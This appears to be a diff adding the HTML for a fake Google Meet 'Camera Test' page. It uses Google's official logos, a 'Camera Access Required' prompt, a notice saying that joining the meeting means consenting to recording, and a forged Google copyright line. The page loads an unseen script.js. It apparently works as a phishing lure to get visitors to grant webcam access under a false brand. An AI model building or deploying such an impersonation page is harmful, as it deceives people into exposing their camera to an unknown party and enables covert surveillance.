@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet - Camera Test</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-512dp/logo_meet_2020q4_color_2x_web_512dp.png">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_2x_icon_124_40_292e71bcb52a56e2a9005164118f183b.png" alt="Google Meet">
+            <h1>Camera Access Required</h1>
+            <p class="subtitle">Please allow camera access to continue with Google Meet</p>
+        </div>
+        
+        <div class="camera-test">
+            <div class="video-container">
+                <video id="webcam" autoplay playsinline></video>
+                <div class="overlay">
+                    <div class="pulse"></div>
+                    <p>Camera Active</p>
+                </div>
+            </div>
+            
+            <div class="controls">
+                <p class="instruction">Click "Allow" to enable your camera for the meeting</p>
+                <button id="allowBtn" class="btn-primary">
+                    <span class="btn-icon">🎥</span> Allow Camera Access
+                </button>
+                <button id="testBtn" class="btn-secondary" style="display:none;">
+                    Test Camera
+                </button>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Connecting to meeting...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>This meeting is being recorded. By joining, you consent to being recorded.</p>
+            <p class="copyright">© 2024 Google LLC. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
